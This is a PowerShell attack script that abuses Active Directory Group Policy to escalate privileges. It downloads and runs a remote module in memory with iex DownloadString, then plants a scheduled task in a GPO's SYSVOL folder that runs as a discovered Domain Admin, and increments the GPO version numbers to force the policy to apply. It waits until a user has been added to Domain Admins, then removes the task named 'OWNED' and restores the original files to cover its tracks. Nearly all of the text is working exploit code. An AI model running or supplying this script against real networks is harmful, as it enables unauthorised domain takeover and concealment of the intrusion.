# Enabling TLS and loading the ActiveDirectory module to memory #
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
iex(New-Object Net.Webclient).DownloadString("https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1")
Import-ActiveDirectory
$mod = (Get-Module | select Name -ExpandProperty Name | findstr /i activedirectory)
if(($mod.Contains("dynamic_code")) -eq "True"){
    $null
} else {
    echo "[-] ActiveDirectory module failed to load!"
    exit(0)
}
$guid = Read-Host "Enter GPO GUID (with {})"
$guid2 = "{"+$guid+"}"
$domain = (Get-ADDomain).Forest
$domaindn = (Get-ADDomain).DistinguishedName
$dc = (Get-ADDomain).InfrastructureMaster
# Checking for gPCMachineExtensionNames for the means of backup and restoration after execution #
if(Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCMachineExtensionNames | Select-Object gPCMachineExtensionNames -ExpandProperty gPCMachineExtensionNames -ErrorAction SilentlyContinue){
    $InitialExtensions = (Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCMachineExtensionNames | Select-Object gPCMachineExtensionNames -ExpandProperty gPCMachineExtensionNames);
} else {
    $noext=1
}
# Looking for an active domain admin account #
$i = 0
while($gotcha -ne "1"){
    $dauser = (Get-ADGroupMember "Domain Admins" | Select-Object SamAccountName -ExpandProperty SamAccountName)[$i]
    if(((net user $dauser /dom | findstr active)[29]) -eq "Y"){
        $gotcha++
    } else {
        $i++
    }
}
# Checking whether a ScheduledTasks.xml file exists in SYSVOL for the means of backup and restoration after execution #
if(cat "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" -ErrorAction SilentlyContinue){
    Copy-Item "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml.old"
    echo "[-] ScheduledTasks file in SYSVOL exists, created a backup file!"
    Copy-Item .\ScheduledTasks.xml "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" -Force 2>&1>$null
} else {
    New-Item -ItemType File -Path "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" -Force 2>&1>$null
    Copy-Item .\ScheduledTasks.xml "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" -Force 2>&1>$null
    echo "[+] Created ScheduledTasks file in SYSVOL!"
}
# Modifying the ScheduledTasks.xml with the gathered infromation #
$pwd = (pwd | select Path -ExpandProperty Path)
$xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
$encoding = 'ASCII'
$xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
$xmlfilecontent | ForEach-Object {$_ -replace "changedomain","$domain"} |
            Set-Content -Encoding $encoding $xmlfile -Force
$xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
$xmlfilecontent | ForEach-Object {$_ -replace "changeuser","$dauser"} |
            Set-Content -Encoding $encoding $xmlfile -Force
$xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
$xmlfilecontent | ForEach-Object {$_ -replace "ownuser","$env:USERNAME"} |
            Set-Content -Encoding $encoding $xmlfile -Force
$xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
$xmlfilecontent | ForEach-Object {$_ -replace "changedc","$dc"} |
            Set-Content -Encoding $encoding $xmlfile -Force
echo "[+] ScheduledTasks file modified!"
$Ext = "[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]"
$GPO = "CN=$guid,CN=Policies,CN=System,$domaindn"
echo "[+] Incrementing GPT.INI Version by 1"
$gptIniFilePath = "\\$domain\SYSVOL\$domain\Policies\$guid\GPT.INI"
$encoding = 'ASCII'
$gptIniContent = Get-Content -Encoding $encoding -Path $gptIniFilePath
# Incrementing GPI.INI version by 1 to update the SYSVOL Machine policy #
foreach ($s in $gptIniContent) {
    if($s.StartsWith("Version")) {
        $num = ($s -split "=")[1]
        $ver = [Convert]::ToInt32($num)
        $newVer = $ver + 1
        (Get-Content $gptIniFilePath) | ForEach-Object {$_ -replace "$ver","$newver" } |
            Set-Content -Encoding $encoding $gptIniFilePath -Force
    }
}
$currentVersion = (Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name versionNumber | Select-Object versionNumber -ExpandProperty versionNumber)
echo "[+] Current GPO AD versionNumber = $currentVersion"
echo "[+] Incrementing version by 1"
$newVersionValue = $currentVersion+1
# Incrementing the AD Machine policy by 1 to match the new SYSVOL policy number #
Set-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name versionNumber -Value $newVersionValue
$currentVersion = (Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name versionNumber | Select-Object versionNumber -ExpandProperty versionNumber)
echo "[+] GPO AD versionNumber = $currentVersion"
if($noext -ne 1){
    echo "[+] Current gPCMachineExtensionNames : $InitialExtensions"
} else {
    echo "[+] Current gPCMachineExtensionNames : <not set>"
}
# Modyfing the gPCMachineExtensionNames attribute of the policy # 
echo "[+] Adding Extensions to the attribute"
Set-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCmachineExtensionNames -Value $Ext$InitialExtensions
$FinalizedGPO = (Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCMachineExtensionNames | Select-Object gPCMachineExtensionNames -ExpandProperty gPCMachineExtensionNames)
if($FinalizedGPO.StartsWith("[{00000000")){
    echo "[+] Successfully written extensions to GPO!"
} else {
    echo "[-] Failed to write gPCMachineExtensionNames!"
    exit(0)
}
echo "`n`n"
# A bad loading screen counting up to 300(5 minute update interval on DCs) #
for ($x = 1; $x -le 300; $x++ ){
    $PercentCompleted = ($x/300*100)
    Write-Progress -Activity "Waiting for GPO update on the DC..." -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
    Start-Sleep -Seconds 1
    if ((Get-ADGroupMember "Domain Admins" | findstr user1) -ne $null) {
        break
    }
}
$timepassed = 0
while((Get-ADGroupMember "Domain Admins" | findstr user1) -eq $null){
    sleep 1
    }
echo "`n`n"
echo "[+] User added to the domain admins group!"
echo "`n`n"
net group "domain admins" /dom
echo "`n`n"
echo "[+] Reverting extensions back to what they were"
# Reverting the gPCMachineExtensionNames #
if($noext -ne 1){
Set-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCmachineExtensionNames -Value "$InitialExtensions"
} else {
    Clear-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCmachineExtensionNames
}

if($noext -ne 1){
echo "[+] gPCMachineExtensionNames reverted back to -> $InitialExtensions"
} else {
    echo "[+] Cleared gPCMachineExtensionNames!"
}
echo "[+] Removing the scheduled task from the DC"
# Trying to delete the scheduled task from the DC #
try{
    Unregister-ScheduledTask -CimSession $dc -TaskName "OWNED" -Confirm:$false
}
catch{
    echo "[-] Scheduled Task Removal Failed! login to the DC and remove it manually."
}
# Reverting the ScheduledTasks.xml to the backup or deletes it #
Remove-Item "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
if(ls "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml.old" -ErrorAction SilentlyContinue){
    move \\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml.old \\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
    echo "[+] XML file resotred!"
} else {
    echo "[+] File removed from SYSVOL"
}
